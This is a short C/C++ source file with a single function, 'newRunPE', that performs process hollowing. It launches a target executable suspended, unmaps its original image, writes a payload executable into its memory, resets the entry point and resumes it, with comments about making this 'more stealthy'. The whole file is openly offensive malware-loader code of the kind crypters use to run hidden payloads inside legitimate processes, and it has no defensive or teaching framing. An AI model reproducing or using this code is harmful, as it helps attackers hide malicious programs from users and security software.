#include <stdio.h>

typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);


void newRunPE(LPSTR szFilePath, LPCTSTR desiredCurrentDirectory, PVOID pFile, LPTSTR commandLine) {
	PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
	PIMAGE_NT_HEADERS INH;				// NT .EXE header
	PIMAGE_SECTION_HEADER ISH;			// Section Header
	PROCESS_INFORMATION PI;    			// Process Information
	STARTUPINFOA SI;           			// Start Up Information
	PCONTEXT CTX;              			// Context Frame
	PDWORD dwImageBase;        			
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	LPVOID pImageBase;	
	PDWORD oldProtect;
	int Count;
	
	IDH = PIMAGE_DOS_HEADER(pFile);
	
		if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
			INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
			
			// Patch payload subsystem to avoid crashes
			INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
	
			if (INH->Signature == IMAGE_NT_SIGNATURE) {
				RtlZeroMemory(&SI, sizeof(SI));
				RtlZeroMemory(&PI, sizeof(PI));				
		
				// Create new instance of target process
				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, desiredCurrentDirectory, &SI, &PI)) {
					CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
					CTX->ContextFlags = CONTEXT_FULL;
					
					// Get image base of target process
					if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
						ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
				
						// Unmap old image
						if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase) {
							xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
							xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
						}
					
						// Allocate new memory in target process for the payload
						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_READWRITE);
						
						if (pImageBase) {
							// Write payload headers and sections into target process
							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						
							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
								ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
								WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
							}
						
							// Fix image base
							WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
							// Fix memory protection after write to be more stealthy							
							VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
							// Set new entry point and resume target main thread
							CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
							SetThreadContext(PI.hThread, LPCONTEXT(CTX));
							ResumeThread(PI.hThread);							
						}
					}
				}
			}
		}
	VirtualFree(pFile, 0, MEM_RELEASE);
}
